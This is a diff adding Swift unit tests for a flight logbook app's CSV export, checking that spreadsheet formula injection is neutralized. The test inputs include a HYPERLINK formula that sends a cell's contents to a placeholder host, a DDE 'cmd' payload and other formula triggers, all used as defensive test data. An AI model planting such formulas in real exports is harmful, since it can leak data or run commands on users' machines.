@@ -273,6 +273,30 @@ final class FlightNumbersTests: XCTestCase {
         XCTAssertEqual(csv.split(separator: "\n").count, 2, "header plus one row")
     }
 
+    /// The instructor on a plan can come from a GPX file anyone wrote, and on a dual flight it is the
+    /// PIC name. In the exported CSV it must stay text, not become a formula. (S9-17)
+    func testCSVKeepsAFormulaFromAnImportedPlanAsText() {
+        let payload = "=HYPERLINK(\"https://example.invalid/?\"&A1,\"logbook\")"
+        let line = LogbookLineBuilder.build(flight: flight(instructor: payload))
+        XCTAssertEqual(line.picName, payload, "precondition: the plan's instructor is the dual flight's PIC")
+
+        let row = LogbookLineBuilder.csv(for: [line]).split(separator: "\n")[1]
+
+        XCTAssertTrue(row.contains("\"'=HYPERLINK("), "a leading quote, inside the quoted cell")
+        XCTAssertFalse(row.contains(",=") || row.contains(",\"="), "no cell starts with =")
+    }
+
+    /// OWASP's triggers, a combining mark that hides one, and the data that must stay as it is.
+    func testEveryFormulaTriggerIsNeutralizedAndPlainNumbersAreNot() {
+        for formula in ["=1+2", "+cmd|' /C calc'!A0", "-1+2", "@SUM(A1:A9)", "\t=1", "=\u{301}1", "-"] {
+            XCTAssertEqual(LogbookLineBuilder.neutralizingFormula(formula), "'" + formula, formula)
+        }
+        XCTAssertEqual(LogbookLineBuilder.escapeCSV("\r=1"), "\"'\r=1\"", "a carriage return also forces quoting")
+        for data in ["-3", "+1.5", "12", "0:45", "06.09.2026", "HB-KFD", "Circuits", ""] {
+            XCTAssertEqual(LogbookLineBuilder.neutralizingFormula(data), data, "\(data) is data")
+        }
+    }
+
     func testPlainTextSkipsEmptyColumns() {
         let text = LogbookLineBuilder.plainText(for: LogbookLineBuilder.build(flight: flight()))
         XCTAssertTrue(text.contains("Total time: 1:29"))
